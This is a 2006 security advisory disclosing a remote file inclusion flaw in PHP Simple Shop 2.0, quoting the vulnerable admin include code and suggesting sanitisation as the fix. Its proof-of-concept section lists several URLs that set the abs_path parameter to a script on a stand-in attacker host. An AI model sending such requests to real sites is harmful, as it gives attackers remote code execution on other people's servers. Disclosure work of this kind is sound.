@@ -1,0 +1,106 @@
+\_   _____/\_   ___ \ /   |   \\_____  \
+ |    __)_ /    \  \//    ~    \/   |   \
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/                              .OR.ID
+ECHO_ADV_44$2006
+
+------------------------------------------------------------------------------
+[ECHO_ADV_44$2006] PHP Simple Shop <= 2.0 (abs_path) Remote File Inclusion
+------------------------------------------------------------------------------
+
+Author		: Ahmad Maulana a.k.a Matdhule
+Date Found	: August, 07th 2006
+Location	: Indonesia, Jakarta
+web		: http://advisories.echo.or.id/adv/adv44-matdhule-2006.txt
+Critical Lvl	: Highly critical
+Impact		: System access
+Where		: From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+PHP Simple Shop
+
+Application	: PHP Simple Shop
+version		: Latest version [2.0]
+URL		: http://www.turnkeywebtools.com/phpsimpleshop
+
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~~
+
+In folder admin we found vulnerability script index.php
+---------------------------index.php---------------------------------------
+....
+<?PHP
+/*
+  index.php - $DATE$ - $TIME$ - $VERSION$
+  
+  PHP Simple Shop
+  http://www.turnkeywebtools.com/phpsimpleshop/
+  
+  Copyright (c) 2001-2005 Turnkey Web Tools, Inc.
+*/
+
+if (isset($abs_path) && $abs_path != "") {
+    include $abs_path."admin/adminglobal.php";
+} else {
+    include "./adminglobal.php";
+} 
+...
+----------------------------------------------------------
+
+Input passed to the "abs_path" parameter in index.php is not
+properly verified before being used. This can be exploited to execute
+arbitrary PHP code by including files from local or external
+resources.
+
+Also affected files :
+
+adminindex.php
+adminglobal.php
+login.php
+menu.php
+header.php
+
+Proof Of Concept:
+~~~~~~~~~~~~~~
+
+http://target.com/[phpsimpleshop_path]/admin/index.php?abs_path=http://attacker.com/inject.txt?
+http://target.com/[phpsimpleshop_path]/admin/adminindex.php?abs_path=http://attacker.com/inject.txt?
+http://target.com/[phpsimpleshop_path]/admin/adminglobal.php?abs_path=http://attacker.com/inject.txt?
+http://target.com/[phpsimpleshop_path]/admin/login.php?abs_path=http://attacker.com/inject.txt?
+http://target.com/[phpsimpleshop_path]/admin/menu.php?abs_path=http://attacker.com/inject.txt?
+http://target.com/[phpsimpleshop_path]/admin/header.php?abs_path=http://attacker.com/inject.txt?
+
+Solution:
+~~~~~~
+- Sanitize variable $abs_path on affected files.
+
+Notification:
+~~~~~~~~~
+
+I've been contacting the web/software administrator to tell about this hole in his system, 
+but instead of giving  a nice response, he replied so rudely and arrogantly. 
+I recommend not to use this product for your own sake.
+
+---------------------------------------------------------------------------
+Shoutz:
+~~
+~ solpot a.k.a chris, J4mbi  H4ck3r thx for the hacking lesson    :)   
+~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,anonymous
+~ bius, lapets, ghoz, t4mbun_hacker, NpR, h4ntu, thama
+~ newbie_hacker@yahoogroups.com, jasakom_perjuangan@yahoogroups.com
+~ Solpotcrew Comunity , #jambihackerlink #e-c-h-o @irc.dal.net
+------------------------------------------------------------------------
+---
+Contact:
+~~~
+ 
+     matdhule[at]gmail[dot]com
+     
+-------------------------------- [ EOF ]----------------------------------
+
+# milw0rm.com [2006-08-07]
